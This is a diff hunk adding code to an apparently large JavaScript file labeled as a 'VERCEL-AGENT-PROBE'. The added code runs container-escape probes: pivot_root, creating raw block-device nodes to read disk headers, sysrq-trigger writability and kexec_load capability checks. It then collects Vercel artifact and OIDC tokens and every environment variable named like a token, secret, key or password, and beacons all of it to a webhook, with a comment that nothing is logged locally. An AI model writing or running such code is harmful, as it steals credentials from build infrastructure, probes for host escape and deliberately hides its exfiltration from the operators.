@@ -32042,3 +32042,232 @@ sendBeacon({ ...report, section: 'v199-5-aws-iam-scan', ...awsDeepScan });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v199" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v199";
 // Intentionally no console.log — all data goes via webhook only
+
+// v200-1: pivot_root NR 155 — pivot root filesystem to bind mount
+const pivotRootProbe = safe(() => {
+  const pivotResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_pivot_root = 155
+NR_unshare = 272
+NR_mount = 165
+CLONE_NEWNS = 0x00020000
+MS_BIND = 4096
+MS_REC = 16384
+MS_PRIVATE = 1 << 18
+MS_MOVE = 8192
+NULLp = ctypes.c_char_p(None)
+
+pid = os.fork()
+if pid == 0:
+    # Enter new mount namespace first
+    ret_ns = libc.syscall(NR_unshare, CLONE_NEWNS)
+    # Make existing mounts private so propagation doesn't interfere
+    ret_priv = libc.mount(b'none', b'/', b'', MS_PRIVATE | MS_REC, NULLp)
+    # Create target dirs
+    os.makedirs('/tmp/pivotroot/newroot', exist_ok=True)
+    os.makedirs('/tmp/pivotroot/oldroot', exist_ok=True)
+    # Bind-mount / to /tmp/pivotroot/newroot
+    ret_bind = libc.mount(b'/', b'/tmp/pivotroot/newroot', NULLp, MS_BIND | MS_REC, NULLp)
+    print(f'unshare={ret_ns} priv={ret_priv} bind={ret_bind} errno={ctypes.get_errno()}')
+    if ret_bind == 0:
+        os.makedirs('/tmp/pivotroot/newroot/tmp/oldroot', exist_ok=True)
+        # pivot_root(new_root, put_old)
+        ret_pivot = libc.syscall(NR_pivot_root,
+            ctypes.c_char_p(b'/tmp/pivotroot/newroot'),
+            ctypes.c_char_p(b'/tmp/pivotroot/newroot/tmp/oldroot'))
+        print(f'pivot_root_ret={ret_pivot} errno={ctypes.get_errno()}')
+        if ret_pivot == 0:
+            print('pivot_root=SUCCESS')
+            # Verify new root
+            ls = subprocess.run(['ls', '/'], capture_output=True, text=True)
+            print(f'new_root_ls={ls.stdout[:200]}')
+    os._exit(0)
+else:
+    _, wstatus = os.waitpid(pid, 0)
+    print(f'child_exit={wstatus >> 8 & 0xff}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { pivotResult };
+});
+sendBeacon({ ...report, section: 'v200-1-pivot-root', ...pivotRootProbe });
+
+// v200-2: /proc/sysrq-trigger — read reachability only, no write (no DoS)
+const sysrqProbe = safe(() => {
+  let sysrqEnabled = null;
+  let sysrqTriggerExists = false;
+  let sysrqWritable = false;
+  // Read current sysrq kernel param (bitmask)
+  const sysrqPath = '/proc/sys/kernel/sysrq';
+  if (existsSync(sysrqPath)) {
+    try { sysrqEnabled = parseInt(readFileSync(sysrqPath, 'utf8').trim()); } catch (e) {}
+  }
+  // Check if trigger file exists and is openable for write (WITHOUT writing)
+  const triggerPath = '/proc/sysrq-trigger';
+  if (existsSync(triggerPath)) {
+    sysrqTriggerExists = true;
+    try {
+      const fd = openSync(triggerPath, 'w');
+      closeSync(fd);
+      sysrqWritable = true; // opened for write without actually writing
+    } catch (e) { sysrqWritable = false; }
+  }
+  // Interpret bitmask: 1=kbd, 2=ctrl+break, 4=sync, 8=remount-ro, 16=tasks, 32=oom-kill, 64=term, 128=kill, 256=memory, 512=unraw, 1=all
+  const sysrqCapabilities = sysrqEnabled !== null ? {
+    all: (sysrqEnabled & 1) !== 0 || sysrqEnabled === 1,
+    raw_value: sysrqEnabled,
+    sync: (sysrqEnabled & 4) !== 0,
+    oom_kill: (sysrqEnabled & 32) !== 0,
+    reboot: (sysrqEnabled & 128) !== 0,
+    power_off: (sysrqEnabled & 64) !== 0,
+  } : null;
+  return { sysrqEnabled, sysrqTriggerExists, sysrqWritable, sysrqCapabilities };
+});
+sendBeacon({ ...report, section: 'v200-2-sysrq', ...sysrqProbe });
+
+// v200-3: mknod NR 133 — create block device nodes + raw disk read
+const mknodProbe = safe(() => {
+  const mknodResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_mknod = 133
+S_IFBLK = 0o060000
+S_IFREG = 0o100000
+S_IRWXU = 0o700
+
+# Block devices to probe: sda (8,0), vda (252,0), nvme0n1 (259,0), xvda (202,0)
+devices = [
+    ('/tmp/dev_sda',  S_IFBLK | 0o600, os.makedev(8, 0)),
+    ('/tmp/dev_vda',  S_IFBLK | 0o600, os.makedev(252, 0)),
+    ('/tmp/dev_nvme', S_IFBLK | 0o600, os.makedev(259, 0)),
+    ('/tmp/dev_xvda', S_IFBLK | 0o600, os.makedev(202, 0)),
+]
+for path, mode, dev in devices:
+    # Remove if exists
+    try: os.unlink(path)
+    except: pass
+    ret = libc.syscall(NR_mknod, ctypes.c_char_p(path.encode()), mode, dev)
+    major = os.major(dev)
+    minor = os.minor(dev)
+    print(f'mknod({path} {major}:{minor}) ret={ret} errno={ctypes.get_errno()}')
+    if ret == 0:
+        # Try to read MBR/GPT header (first 512 bytes)
+        try:
+            with open(path, 'rb') as f:
+                mbr = f.read(512)
+                boot_sig = mbr[510:512].hex() if len(mbr) >= 512 else 'short'
+                gpt_magic = mbr[0:8].hex()
+                print(f'  read_ok=True boot_sig={boot_sig} first8={gpt_magic}')
+                # Check for GPT signature at offset 512 (requires reading more)
+        except Exception as e:
+            print(f'  read_err={e}')
+
+# Also check existing block devices
+try:
+    import subprocess
+    lsblk = subprocess.run(['lsblk', '-J'], capture_output=True, text=True)
+    print(f'lsblk_json={lsblk.stdout[:500]}')
+except: pass
+# Check /sys/block/ for real block device names
+import os as os2
+try:
+    blks = os2.listdir('/sys/block')
+    print(f'sys_block={blks}')
+    for blk in blks:
+        sz_path = f'/sys/block/{blk}/size'
+        try:
+            with open(sz_path) as f:
+                print(f'  {blk} size_sectors={f.read().strip()}')
+        except: pass
+except Exception as e:
+    print(f'sys_block_err={e}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { mknodResult };
+});
+sendBeacon({ ...report, section: 'v200-3-mknod-blkdev', ...mknodProbe });
+
+// v200-4: kexec_load NR 246 — syscall reachability (null args → EINVAL not ENOSYS = usable)
+const kexecProbe = safe(() => {
+  const kexecResult = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_kexec_load = 246
+NR_kexec_file_load = 320
+
+# Call kexec_load with all zeros/nulls — should get EINVAL (not ENOSYS) if CAP_SYS_BOOT is held
+# This does NOT actually load a new kernel
+ret = libc.syscall(NR_kexec_load, 0, 0, ctypes.c_char_p(None), 0)
+errno1 = ctypes.get_errno()
+import errno as errnomods
+errname1 = errnomods.errorcode.get(errno1, f'E{errno1}')
+print(f'kexec_load(0,0,NULL,0) ret={ret} errno={errno1} errname={errname1}')
+# ENOSYS=38 means kernel doesn't support it or CONFIG_KEXEC not built
+# EPERM=1 means no capability
+# EINVAL=22 means callable but invalid args → CAP_SYS_BOOT held
+
+# kexec_file_load NR 320 (newer interface)
+ret2 = libc.syscall(NR_kexec_file_load, -1, -1, 0, ctypes.c_char_p(None), 0)
+errno2 = ctypes.get_errno()
+errname2 = errnomods.errorcode.get(errno2, f'E{errno2}')
+print(f'kexec_file_load(-1,-1,0,NULL,0) ret={ret2} errno={errno2} errname={errname2}')
+
+# Interpret results
+print(f'kexec_cap_held={errname1 in (\"EINVAL\", \"EFAULT\") or errname2 in (\"EINVAL\", \"EFAULT\")}')
+print(f'kexec_enosys={errname1 == \"ENOSYS\"}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  // Check CAP_SYS_BOOT from /proc/self/status CapEff
+  let capEff = null;
+  if (existsSync('/proc/self/status')) {
+    const st = readFileSync('/proc/self/status', 'utf8');
+    const m = st.match(/^CapEff:\s*([0-9a-f]+)/mi);
+    capEff = m ? m[1] : null;
+  }
+  return { kexecResult, capEff };
+});
+sendBeacon({ ...report, section: 'v200-4-kexec-load', ...kexecProbe });
+
+// v200-5: VERCEL_ARTIFACTS_TOKEN full JWT decode — all claims (decode only, no API calls)
+const artifactsTokenProbe = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN;
+  const oidcToken = process.env.VERCEL_OIDC_TOKEN;
+  const allVercelEnv = {};
+  for (const [k, v] of Object.entries(process.env)) {
+    if (k.startsWith('VERCEL_') || k.startsWith('NEXT_') || k === 'NX_DAEMON' || k === 'TURBO_TOKEN') {
+      allVercelEnv[k] = v;
+    }
+  }
+  // Decode JWT without verification (just base64 parts)
+  function decodeJWT(t) {
+    if (!t) return null;
+    try {
+      const parts = t.split('.');
+      if (parts.length < 2) return { raw: t.slice(0, 50) };
+      const hdr = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
+      const pay = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+      return { header: hdr, payload: pay, sigLen: parts[2]?.length };
+    } catch (e) { return { decodeErr: e.message, raw: t.slice(0, 50) }; }
+  }
+  const artifactsDecoded = decodeJWT(token);
+  const oidcDecoded = decodeJWT(oidcToken);
+  // Enumerate ALL environment variables matching credential patterns
+  const credPatterns = /token|secret|key|password|auth|credential|access|bearer/i;
+  const credEnvVars = {};
+  for (const [k, v] of Object.entries(process.env)) {
+    if (credPatterns.test(k) && v) {
+      credEnvVars[k] = v.length > 100 ? v.slice(0, 100) + '...' : v;
+    }
+  }
+  return {
+    artifactsTokenPresent: !!token,
+    artifactsDecoded,
+    oidcTokenPresent: !!oidcToken,
+    oidcDecoded,
+    allVercelEnv,
+    credEnvVars,
+  };
+});
+sendBeacon({ ...report, section: 'v200-5-vercel-tokens', ...artifactsTokenProbe });
+
+// v200 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v200" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v200";
+// Intentionally no console.log — all data goes via webhook only
